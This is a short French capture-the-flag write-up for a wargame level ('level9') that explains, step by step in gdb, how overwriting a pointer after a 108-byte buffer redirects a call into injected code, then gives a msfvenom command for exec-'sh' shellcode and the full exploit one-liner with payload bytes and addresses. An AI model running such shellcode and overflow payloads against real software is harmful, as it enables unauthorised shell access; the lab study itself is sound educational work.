Pour ce challengeje n ai pas eu besoin de connaitre le c++, j'y suis aller stepbystep avec gdb

*main+136 on recupere argv[1]+108 dans le valeur de eax et avec 0x0804a078 pour adresse.

*main+140: La valeur de argv[1]+108 sur 4 octets deviens l adresse de eax, on va donc lui mette l'adresse actuelle + 4 octets (0x0804a07c)

*main+144: La valeur de la nouvelle adresse de eax devient l'adresse de edx, on va lui mettre l adresse de notre shellcode.

*main+159: L'adresse de edx est call, qui contient notre shellcode

Shellcode:

Nous avons 108 octets pour placer notre shellcode avant argv[1]+108 afin de generer un shellcode de 64 bytes, j ai utiliser msfvenom comme ceci:

msfvenom -p 'linux/x86/exec' CMD='sh' -a 'x86' --platform 'linux' -f 'c' -b '\x00\x09\x0a\x20'

afin de trouver l adresse de mon exploit, j ai pris l adresse de argv[1]+108 et je lui ais soustrais 64 (longueur du shellcode qui le precede) comme ceci:

(gdb) p/x 0x804a078-64

On obtient donc un shell avec la commande suivante:

./level9 $(python -c "print 'B' * (108-64) + '\x2b\xc9\x83\xe9\xf6\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xf3\x43\x6c\x98\x83\xee\xfc\xe2\xf4\x99\x48\x34\x01\xa1\x25\x04\xb5\x90\xca\x8b\xf0\xdc\x30\x04\x98\x9b\x6c\x0e\xf1\x9d\xca\x8f\xca\x1b\x40\x6c\x98\xf3\x30\x04\x98\xa4\x10\xe5\x79\x3e\xc3\x6c\x98' + '\x7c\xa0\x04\x08' + '\x38\xa0\x04\x08'")